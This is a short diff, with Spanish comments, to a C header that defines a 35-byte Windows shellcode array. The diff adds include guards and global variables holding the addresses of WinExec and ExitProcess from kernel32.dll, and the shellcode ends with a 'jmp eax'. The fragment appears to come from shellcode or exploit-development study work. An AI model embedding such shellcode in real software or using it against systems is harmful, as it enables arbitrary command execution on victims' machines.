@@ -5,6 +5,11 @@
 		de las funciones que serán llamadas de kernel32.dll.
  */
 
+#ifndef SHELLCODE_H
+#define SHELLCODE_H
+
+unsigned long winexec_addr;
+unsigned long exitprocess_addr;
 
 /* Definimos la shellcode. */
 unsigned char shellcode[35] = {
@@ -42,3 +47,5 @@ unsigned char shellcode[35] = {
 	0x00, 0x00, 0x00, 0x00, 	/* Dirección de ExitProcess en kernel32.dll */ 
 	0xFF, 0xE0					/* jmp eax 		*/ 
 };
+
+#endif
